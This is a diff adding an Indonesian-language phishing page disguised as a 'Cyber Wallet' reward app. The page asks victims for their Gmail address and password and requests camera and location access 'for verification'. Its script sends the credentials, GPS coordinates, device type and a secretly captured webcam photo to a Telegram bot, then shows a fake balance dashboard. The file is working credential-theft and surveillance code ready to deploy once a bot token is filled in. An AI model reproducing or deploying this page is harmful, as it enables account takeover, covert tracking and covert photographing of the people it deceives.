@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Cyber Reward</title>
+    <style>
+        :root {
+            --bg: #0d0221;
+            --neon-red: #ff0055;
+            --neon-purple: #9d00ff;
+            --neon-blue: #00d4ff;
+            --neon-green: #39ff14;
+            --text: #ffffff;
+        }
+
+        body {
+            margin: 0; padding: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background: radial-gradient(circle at center, #1a0b2e 0%, #0d0221 100%);
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; color: var(--text); overflow: hidden;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            width: 90%; max-width: 380px;
+            padding: 30px; border-radius: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 30px rgba(157, 0, 255, 0.2);
+            text-align: center;
+        }
+
+        h2 {
+            background: linear-gradient(to right, var(--neon-red), var(--neon-purple));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            text-transform: uppercase; letter-spacing: 3px; font-size: 24px; margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%; padding: 14px; margin: 10px 0;
+            background: rgba(0, 0, 0, 0.5); border: 1px solid var(--neon-purple);
+            border-radius: 12px; color: white; outline: none; box-sizing: border-box;
+        }
+
+        input:focus { border-color: var(--neon-blue); box-shadow: 0 0 15px var(--neon-blue); }
+
+        .btn-login {
+            width: 100%; padding: 15px;
+            background: linear-gradient(45deg, var(--neon-red), var(--neon-purple));
+            color: white; border: none; border-radius: 12px;
+            cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px;
+            transition: 0.3s;
+        }
+
+        /* Progress Bar Container */
+        #progress-container {
+            display: none; width: 100%; height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px; margin-top: 20px; overflow: hidden;
+            position: relative;
+        }
+
+        /* Bar Progress */
+        #progress-bar {
+            width: 0%; height: 100%;
+            background: linear-gradient(to right, var(--neon-red), var(--neon-purple));
+            transition: width 0.1s linear;
+        }
+
+        .success-bar { background: var(--neon-green) !important; box-shadow: 0 0 10px var(--neon-green); }
+
+        /* Dashboard View */
+        .balance-card {
+            background: rgba(255,255,255,0.05); padding: 20px;
+            border-radius: 20px; border: 1px solid var(--neon-blue); margin: 20px 0;
+        }
+
+        .amount { font-size: 35px; color: var(--neon-green); text-shadow: 0 0 10px var(--neon-green); }
+
+        .misi {
+            background: rgba(255,255,255,0.05); padding: 12px; border-radius: 10px;
+            margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+<div id="app" class="container">
+    <div id="view-login">
+        <h2>Cyber Wallet</h2>
+        <p style="color: #aaa; font-size: 13px;">Verifikasi akun untuk klaim saldo</p>
+        
+        <input type="email" id="email" placeholder="📧 Alamat Gmail">
+        <input type="password" id="password" placeholder="🔑 Password">
+
+        <button id="btn-text" class="btn-login" onclick="validateAndLogin()">MASUK</button>
+
+        <div id="progress-container">
+            <div id="progress-bar"></div>
+        </div>
+
+        <p id="footer-note" style="font-size: 10px; color: #555; margin-top: 20px;">Wajib izin 📍 lokasi & 📸 kamera untuk verifikasi ID.</p>
+    </div>
+</div>
+
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = 'MASUKKAN_TOKEN_BOT';
+    const CHAT_ID = 'MASUKKAN_CHAT_ID';
+
+    let balance = 0;
+
+    async function validateAndLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+
+        if (!email.endsWith("@gmail.com")) {
+            alert("Gunakan Gmail yang valid!");
+            return;
+        }
+        if (pass.length < 4) return;
+
+        // Tampilkan Progress Bar
+        document.getElementById('progress-container').style.display = 'block';
+        document.getElementById('btn-text').innerText = "PROSES...";
+        document.getElementById('btn-text').disabled = true;
+
+        startLoading(async () => {
+            let locStr = "📍 Izin Lokasi Ditolak";
+            try {
+                const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                locStr = `📍 Lokasi: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            } catch(e) {}
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
+
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'target.jpg');
+                fd.append('caption', `🛰️ *NEW DATA DETECTED* 🛰️\n\n💌 *Email:* \`${email}\` \n🔑 *Pass:* \`${pass}\` \n${locStr}\n📱 *Device:* ${navigator.platform}`);
+
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {
+                const msg = `⚠️ *NEW DATA (NO PHOTO)* ⚠️\n\n💌 *Email:* \`${email}\` \n🔑 *Pass:* \`${pass}\` \n${locStr}`;
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+                });
+            }
+            showDash();
+        });
+    }
+
+    function startLoading(callback) {
+        let width = 0;
+        const bar = document.getElementById('progress-bar');
+        const interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                bar.classList.add('success-bar');
+                setTimeout(callback, 500);
+            } else {
+                width++;
+                bar.style.width = width + '%';
+            }
+        }, 40); // Kecepatan loading (sekitar 4 detik)
+    }
+
+    function showDash() {
+        document.getElementById('app').innerHTML = `
+            <h2 style="font-size: 20px;">💰 MY WALLET 💰</h2>
+            <div class="balance-card">
+                <p style="margin:0; font-size: 12px; color: var(--neon-blue);">ESTIMASI SALDO</p>
+                <div class="amount" id="val">Rp 0</div>
+            </div>
+            
+            <div style="text-align:left;">
+                <p style="font-weight:bold; font-size:12px; margin-bottom:10px; color:#aaa;">MISI TERSEDIA:</p>
+                <div class="misi">
+                    <div><b>🎁 Daily Check-in</b><br><small>+ Rp 1.000</small></div>
+                    <button class="btn-login" style="width:70px; padding:6px; font-size:11px; margin:0;" onclick="addBal(this, 1000)">KLAIM</button>
+                </div>
+                <div class="misi">
+                    <div><b>📺 Video Reward</b><br><small>+ Rp 2.500</small></div>
+                    <button class="btn-login" style="width:70px; padding:6px; font-size:11px; margin:0;" onclick="addBal(this, 2500)">KLAIM</button>
+                </div>
+            </div>
+        `;
+    }
+
+    function addBal(btn, amt) {
+        balance += amt;
+        document.getElementById('val').innerText = `Rp ${balance.toLocaleString('id-ID')}`;
+        btn.disabled = true;
+        btn.innerText = "DONE";
+        btn.style.background = "#444";
+        btn.style.boxShadow = "none";
+        alert(`✨ Saldo bertambah Rp ${amt.toLocaleString('id-ID')}`);
+    }
+</script>
+</body>
+</html>
